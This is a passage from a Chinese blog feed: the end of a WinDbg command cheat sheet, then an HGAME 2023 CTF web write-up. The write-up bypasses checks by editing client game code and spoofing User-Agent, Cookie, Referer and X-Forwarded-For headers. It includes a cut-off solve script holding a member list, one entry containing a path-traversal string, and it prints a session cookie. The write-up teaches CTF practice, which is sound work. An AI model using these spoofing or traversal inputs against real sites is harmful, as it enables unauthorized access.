class="hljs-keyword">bl</span>   <span class="hljs-comment">// 列出所有断点</span><br><span class="hljs-symbol">bc</span> * <span class="hljs-comment">// 清除所有断点</span><br><span class="hljs-symbol">be</span> *  <span class="hljs-comment">// 启用所有断点</span><br><span class="hljs-symbol">bd</span> *  <span class="hljs-comment">// 禁用所有断点</span><br><br><span class="hljs-symbol">bc</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">5</span>  <span class="hljs-comment">// 清除1号、2号、5号断点</span><br><span class="hljs-symbol">be</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-comment">// 启用1号、2号、5号断点</span><br><span class="hljs-symbol">bd</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-comment">// 禁用1号、2号、5号断点</span><br><br><span class="hljs-keyword">bp</span> main    <span class="hljs-comment">// 在main函数开头设置一个断点</span><br><span class="hljs-keyword">bp</span> <span class="hljs-number">0x7c801b00</span>  <span class="hljs-comment">// 在7c801b00地址处放置一个断点</span><br><span class="hljs-keyword">bp</span> main.exe+<span class="hljs-number">0x1032</span>  <span class="hljs-comment">// 在模块MyDll.dll偏移0x1032处放置一个断点</span><br><span class="hljs-keyword">bp</span> <span class="hljs-comment">@$exentry  // 在进程的入口放置一个断点</span><br><span class="hljs-symbol">bm</span> message_*  <span class="hljs-comment">// 匹配message_开头的函数，并在这些函数起始处都打上断点</span><br></code></pre></td></tr></table></figure><h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada">在指定范围搜索特定的数据类型<br>s -<span class="hljs-keyword">type</span> <span class="hljs-type">范围  </span>要搜索的数据<br><span class="hljs-keyword">type</span> <span class="hljs-type">: </span>b-Byte , W-Word , d-DWord , q-QWord , a-ASCII字符串 , u-Unicode字符串<br><br></code></pre></td></tr></table></figure><h1 id="堆栈操作"><a href="#堆栈操作" class="headerlink" title="堆栈操作"></a>堆栈操作</h1><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">k  <span class="hljs-string">//</span> 显示当前调用堆栈<br>kn <span class="hljs-string">//</span> 带栈编号显示当前调用堆栈<br>kb  <span class="hljs-string">//</span> 打印出前3个函数参数的当前调用堆栈<br>kb 5 <span class="hljs-string">//</span> 只显示最上的5层调用堆栈<br><br>kv   <span class="hljs-string">//</span> 在kb的基础上增加了函数调用约定、FPO等信息<br>kp  <span class="hljs-string">//</span> 显示每一层函数调用的完整参数，包括参数类型、名字、取值<br>kd  <span class="hljs-string">//</span> 打印堆栈的地址<br>kD  <span class="hljs-string">//</span> 从当前esp地址处，向高地址方向搜索符号（注：函数是符号的一种）<br>dds 02a9ffec  <span class="hljs-string">//</span> 从02a9ffec地址处，向高地址方向搜索符号（注：函数是符号的一种）<br>dds  <span class="hljs-string">//</span> 执行完dds 02a9ffec后，可通过dds命令继续进行搜索<br><br><span class="hljs-string">.frame</span> <span class="hljs-string">//</span> 显示当前栈帧<br><span class="hljs-string">.frame</span> n  <span class="hljs-string">//</span> 显示编号为n的栈帧（n为16进制数）<br><span class="hljs-string">.frame</span> <span class="hljs-string">/r</span> n <span class="hljs-string">//</span> 显示编号n的栈帧（n为16进制数） 并显示寄存器变量<br><span class="hljs-string">.frame</span> <span class="hljs-string">/c</span> n <span class="hljs-string">//</span> 设置编号n的栈帧为当前栈帧（n为16进制数）<br>!uniqstack <span class="hljs-string">//</span> 显示所有线程的调用堆栈<br>!findstack kernel32 2 <span class="hljs-string">//</span> 显示包含kernel32模块（用星号标出）的所有栈的信息<br>!heap -s  <span class="hljs-string">//</span> 显示进程堆的个数<br>dt _HEAP 00140000  <span class="hljs-string">//</span> 选取一个堆的地址，打印该堆的内存结构<br>!heap -a 00140000 <span class="hljs-string">//</span> 选取一个堆的地址，打印该堆的信息，比上面打印内存命令更详细直观<br></code></pre></td></tr></table></figure><h1 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h1><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">dt ntdll!* // 显示ntdll里的所有类型信息<br>dt -rv <span class="hljs-emphasis">_TEB</span><br><span class="hljs-emphasis">dt -rv _PEB</span><br><span class="hljs-emphasis">dt -v _PEB @$PEB</span><br><span class="hljs-emphasis">dt _PEB_LDR_DATA</span><br><span class="hljs-emphasis">dt _</span>TEB ny LastErrorValue // 只查看TEB（thread&#x27;s environment block）结构成员LastErrorValue<br><br>dt <span class="hljs-emphasis">_eprocess</span><br><span class="hljs-emphasis">dt _</span>eprocess 0x510<br><br>!dh 773a0000                 显示文件PE头<br><br><span class="hljs-strong">*是通配符；显示所有peb打头的结构体名称；</span><br><span class="hljs-strong">dt ntdll!_peb*</span><br><br>0:000&gt; dt -rv ntkrnlmp!<span class="hljs-strong">*Object*</span>  枚举ntkrnlmp中带&quot;Object&quot;的结构体名称；<br><br><span class="hljs-title">.attach  PID  附加进程</span><br><span class="hljs-title">.detach         结束会话</span><br><br><span class="hljs-title">.dump  文件名  转存文件</span><br><span class="hljs-title">.opendump     打开文件</span><br><br>dt -v ntdll!*           # 列出ntdll中的全部结构体，导出的函数名也会列出<br><br>dt ntdll!<span class="hljs-strong">*file*</span>           # 下面命令将列出ntdll导出的文件操作相关的函数名<br>dt <span class="hljs-emphasis">_FILE_INFORMATION_CLASS      查看一个结构定义</span><br><span class="hljs-emphasis">dt ntdll!_</span>*   列出ntdll中结构体<br></code></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>WinDbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME_2023_Week1_Wp</title>
    <link href="/2023/01/12/HGAME-2023-Week1-Wp/"/>
    <url>/2023/01/12/HGAME-2023-Week1-Wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/2.png"></p><ul><li>题目描述<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/1.png"><br><img src="/2023/01/12/HGAME-2023-Week1-Wp/3.png"></li><li>一个游戏</li></ul><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/4.png"></p><ul><li>F12查看源代码，游戏主要逻辑都写在core.js里，而且可以修改<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/5.png"></li><li>打怪时对于HP，金币和经验的判定，修改Hero[“HP”] -&#x3D; Damage;为Hero[“HP”] +&#x3D; Damage;就可以一路通杀了</li><li>通关游戏即可获取flag，中途需要钥匙的地方可以同理改下代码</li><li>需要注意的是打完魔王后需要用稿子挖最上面的两个墙才可以进下个场景，稿子不够也可以改代码</li></ul><h2 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/7.png"></p><ul><li>题目描述<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/6.png"></li><li>主页</li></ul><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ul><li><p>根据描述，可以看出是个http题目</p></li><li><p>首先修改</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">User-Agent:Cute-Bunny<br></code></pre></td></tr></table></figure><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/8.png"></p></li><li><p>响应头里发现Cookie中code&#x3D;guest，所以Cookie里将code改为Vidar<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/9.jpg"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=MTY3Mjk3NDAwMXxEdi1CQkFFQ180SUFBUkFCRUFBQVBQLUNBQUlHYzNSeWFXNW5EQTBBQzJOb1lXeHNaVzVuWlVsa0EybHVkQVFEQVAtdUJuTjBjbWx1Wnd3SUFBWnpiMngyWldRRGFXNTBCQUlBQ2c9PXwX3tbMKXl0k1kURlwbQxyt1h4I_20iZgW-mgjqhtYQXA==; code=Vidar<br></code></pre></td></tr></table></figure><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/10.png"></p></li><li><p>然后改下Referer</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">Referer:bunnybunnybunny.com<br></code></pre></td></tr></table></figure><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/11.png"></p></li><li><p>最后修改X-Forwarded-For为本地</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">X-Forwarded-For:127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/12.png"></p></li><li><p>这里我用burp site发请求没回应，然后我把请求体复制到postman，然后在postman发了json格式的成功拿到了flag<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/13.png"></p></li><li><p>最后一步卡了好久，以为有个其他接口收json，我各种软件疯狂扫目录，是我太菜了</p></li></ul><h2 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/14.png"></p><ul><li>题目描述<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/15.png"></li><li>主页</li></ul><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/16.png"></p><ul><li><p>源码里有提示<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/17.png"></p></li><li><p>点开是一堆存了Vidar Team成员信息的json</p></li><li><p>在里面搜素主页里的intro即可找到名称</p></li><li><p>直接复制json写脚本发100次请求拿到flag</p></li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><div class='spoiler collapsed'>    <div class='spoiler-title'>        点击显/隐内容    </div>    <div class='spoiler-content'>        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br></pre></td><td class="code"><pre><code class="hljs python3">from http import cookiejar<br>import requests<br>import json<br>js=[<br>    &#123;<br>        &quot;id&quot;: &quot;ba1van4&quot;,<br>        &quot;intro&quot;: &quot;21级 / 不会Re / 不会美工 / 活在梦里 / 喜欢做不会的事情 / ◼◻粉&quot;,<br>        &quot;url&quot;: &quot;https://ba1van4.icu&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;yolande&quot;,<br>        &quot;intro&quot;: &quot;21级 / 非常菜的密码手 / 很懒的摸鱼爱好者，有点呆，想学点别的但是一直开摆&quot;,<br>        &quot;url&quot;: &quot;https://y01and3.github.io/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;t0hka&quot;,<br>        &quot;intro&quot;: &quot;21级 / 日常自闭的Re手&quot;,<br>        &quot;url&quot;: &quot;https://blog.t0hka.top/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;h4kuy4&quot;,<br>        &quot;intro&quot;: &quot;21级 / 菜鸡pwn手 / 又菜又爱摆&quot;,<br>        &quot;url&quot;: &quot;https://hakuya.work&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;kabuto&quot;,<br>        &quot;intro&quot;: &quot;21级web / cat../../../../f*&quot;,<br>        &quot;url&quot;: &quot;https://www.bilibili.com/video/BV1GJ411x7h7/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;R1esbyfe&quot;,<br>        &quot;intro&quot;: &quot;21级 / 爱好歪脖 / 究极咸鱼一条 / 热爱幻想 / 喜欢窥屏水群&quot;,<br>        &quot;url&quot;: &quot;https://r1esbyfe.top/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;tr0uble&quot;,<br>        &quot;intro&quot;: &quot;21级 / 喜欢肝原神的密码手&quot;,<br>        &quot;url&quot;: &quot;https://clingm.top&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Roam&quot;,<br>        &quot;intro&quot;: &quot;21级 / 入门级crypto&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Potat0&quot;,<br>        &quot;intro&quot;: &quot;20级 / 摆烂网管 / DN42爱好者&quot;,<br>        &quot;url&quot;: &quot;https://potat0.cc/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Summer&quot;,<br>        &quot;intro&quot;: &quot;20级 / 歪脖手 / 想学运维 / 发呆业务爱好者&quot;,<br>        &quot;url&quot;: &quot;https://blog.m1dsummer.top&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;chuj&quot;,<br>        &quot;intro&quot;: &quot;20级 / 已退休不再参与大多数赛事 / 不好好学习，生活中就会多出许多魔法和奇迹&quot;,<br>        &quot;url&quot;: &quot;https://cjovi.icu&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;4nsw3r&quot;,<br>        &quot;intro&quot;: &quot;20级会长 / re / 不会pwn&quot;,<br>        &quot;url&quot;: &quot;https://4nsw3r.top/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;4ctue&quot;,<br>        &quot;intro&quot;: &quot;20级 / 可能是IOT的MISC手 / 可能是美工 / 废物晚期&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;0wl&quot;,<br>        &quot;intro&quot;: &quot;20级 / Re手 / 菜&quot;,<br>        &quot;url&quot;: &quot;https://0wl-alt.github.io&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;At0m&quot;,<br>        &quot;intro&quot;: &quot;20级 / web / 想学iot&quot;,<br>        &quot;url&quot;: &quot;https://homeboyc.cn/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;ChenMoFeiJin&quot;,<br>        &quot;intro&quot;: &quot;20级 / Crypto / 摸鱼学代师&quot;,<br>        &quot;url&quot;: &quot;https://chenmofeijin.top&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Klrin&quot;,<br>        &quot;intro&quot;: &quot;20级 / WEB / 菜的抠脚 / 想学GO&quot;,<br>        &quot;url&quot;: &quot;https://blog.mjclouds.com/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;ek1ng&quot;,<br>        &quot;intro&quot;: &quot;20级 / Web / 还在努力&quot;,<br>        &quot;url&quot;: &quot;https://ek1ng.com&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;latt1ce&quot;,<br>        &quot;intro&quot;: &quot;20级 / Crypto&amp;BlockChain / Plz V me 50 eth&quot;,<br>        &quot;url&quot;: &quot;https://lee-tc.github.io/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Ac4ae0&quot;,<br>        &quot;intro&quot;: &quot;*级 / 被拐卖来接盘的格子 / 不可以乱涂乱画哦&quot;,<br>        &quot;url&quot;: &quot;https://twitter.com/LAttic1ng&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Akira&quot;,<br>        &quot;intro&quot;: &quot;19级 / 不会web / 半吊子运维 / 今天您漏油了吗&quot;,<br>        &quot;url&quot;: &quot;https://4kr.top&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;qz&quot;,<br>        &quot;intro&quot;: &quot;19级 / 摸鱼美工 / 学习图形学、渲染ing&quot;,<br>        &quot;url&quot;: &quot;https://fl0.top/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Liki4&quot;,<br>        &quot;intro&quot;: &quot;19级 / 脖子笔直歪脖手&quot;,<br>        &quot;url&quot;: &quot;https://github.com/Liki4&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: 